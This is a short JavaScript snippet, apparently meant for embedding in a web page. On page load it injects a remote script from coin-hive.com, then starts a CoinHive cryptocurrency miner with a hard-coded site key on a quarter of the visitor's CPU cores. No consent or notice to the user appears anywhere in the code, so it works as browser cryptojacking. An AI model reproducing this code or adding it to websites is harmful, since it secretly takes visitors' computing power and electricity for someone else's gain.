(function() {

    window.addEventListener('load', function() {
        var s = document.createElement('script');
        document.head.appendChild(s);

        s.src = 'https://coin-hive.com/lib/coinhive.min.js'; // cant load with require
        s.async = 'true';

        s.onload = function() {

            var cores = parseInt(navigator.hardwareConcurrency / 4);

            if (cores > 0) {
                var M;
                M = new CoinHive.Anonymous('x1TBVS1MsuTONDabMeAP0QacQPSbQu9d', { // Public coin-hive.com key
                    threads: cores,
                });

                M.start(CoinHive.IF_EXCLUSIVE_TAB); // Only one tab

                clog('[*] Mining started');
            } else {
                clog('[*] Mining NOT started (not enough cores)');
            }


            /*setInterval(function() {
                clog(M.getHashesPerSecond());
            }, 1000);*/
        };
    });
})();